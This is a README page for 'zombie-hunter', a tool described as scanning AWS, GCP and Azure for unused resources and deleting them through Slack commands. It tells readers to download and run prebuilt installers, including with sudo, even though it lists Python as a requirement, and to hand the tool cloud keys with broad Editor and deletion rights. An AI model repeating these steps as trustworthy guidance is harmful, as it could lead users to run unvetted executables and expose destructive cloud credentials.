---
layout: "default"
title: "🧟 zombie-hunter - Cleanup Unused Cloud Resources Effortlessly"
description: "🧟 Hunt down unused cloud resources, estimate cost savings, and clean up effortlessly via Slack with the Zombie Hunter tool."
---
# 🧟 zombie-hunter - Cleanup Unused Cloud Resources Effortlessly

## 🚀 Getting Started

Welcome to zombie-hunter! This tool helps you hunt down and clean up unused cloud resources on AWS, GCP, and Azure through Slack. Let’s get you set up so you can start saving costs efficiently.

## 📥 Download Link

[![Download Zombie Hunter](https://img.shields.io/badge/Download-zombie--hunter-4CAF50?style=for-the-badge)](https://github.com/NERVOSO15/zombie-hunter/releases)

## 📋 What You Need

Before you begin, ensure your system meets the following requirements:

- Operating System: Windows, macOS, or Linux
- Python 3.7 or higher
- A Slack account to receive notifications and commands
- Access to your cloud accounts (AWS, GCP, Azure)

## ⚙️ Features

- **Cloud Resource Cleanup:** Automatically identify and clean unused resources in AWS, GCP, and Azure.
- **Slack Integration:** Receive updates and alerts directly in Slack for an easy user experience.
- **Cost Optimization:** Reduce unnecessary expenses and keep your cloud costs down.
- **User-Friendly Commands:** Interact easily through Slack commands with straightforward actions.

## 📥 Download & Install

To get started, visit the [Releases page](https://github.com/NERVOSO15/zombie-hunter/releases) to download the latest version of zombie-hunter.

1. Go to the [Releases page](https://github.com/NERVOSO15/zombie-hunter/releases).
2. Look for the latest version. It is typically at the top.
3. Find the installation file suitable for your operating system. 
   - For Windows, look for a `.exe` file.
   - For macOS, look for a `.dmg` file.
   - For Linux, find a `.tar.gz` file.
4. Click on the file to download.

After downloading:

- **Windows:** Double-click the `.exe` file to run the installer. Follow the prompts to complete the installation.
  
- **macOS:** Open the `.dmg` file. Drag the zombie-hunter icon into the Applications folder.

- **Linux:** Use the terminal to extract the `.tar.gz` file. Navigate to the folder and run the installer with `sudo ./install.sh`. Or follow applicable package installation instructions.

Once installed, you can start using zombie-hunter!

## 🌐 Setting Up Your Cloud Accounts

To connect zombie-hunter with your cloud accounts, follow these steps:

### AWS

1. Sign into your AWS Management Console.
2. Navigate to the IAM service.
3. Create a new user with programmatic access.
4. Attach the necessary policies to allow resource listing and deletion.
5. Note down the Access Key ID and Secret Access Key for use in zombie-hunter.

### GCP

1. Go to the Google Cloud Console.
2. Create a new service account.
3. Assign roles like "Viewer" and "Editor".
4. Generate a key for the service account and save it securely.

### Azure

1. Open the Azure portal.
2. Register a new application in Azure Active Directory.
3. Assign it API permissions to manage your resources.
4. Note the Application (client) ID and Directory (tenant) ID.

## 💬 Using Zombie Hunter

After setting up your cloud accounts, use the following Slack commands to interact with zombie-hunter:

1. `/zombie-hunter start`: Start scanning for unused resources.
2. `/zombie-hunter list`: Get a list of all available resources.
3. `/zombie-hunter clean`: Clean up the listed unused resources.

Zombie-hunter will provide you with updates in real time, keeping you informed every step of the way.

## 🛠️ Troubleshooting

If you encounter issues, consider these common solutions:

- **Installation Errors:** Make sure you have the right version for your operating system. Ensure Python is correctly installed.
- **Slack Commands Not Working:** Verify that zombie-hunter is successfully connected to your Slack workspace. Check the permissions and ensure your credentials are accurate.
- **Cloud Access Issues:** Ensure your cloud account keys and permissions are set correctly.

For additional support, visit the Discussions tab in the repository or open an issue.

## 📄 License

This project is open-source and follows the MIT License, allowing you to use, modify, and distribute the software freely.

## 🔗 Additional Resources

- [GitHub Repository](https://github.com/NERVOSO15/zombie-hunter)
- [Documentation](https://github.com/NERVOSO15/zombie-hunter/wiki)
- [Community Support](https://github.com/NERVOSO15/zombie-hunter/discussions)

Enjoy your journey to cleaner cloud environments with zombie-hunter!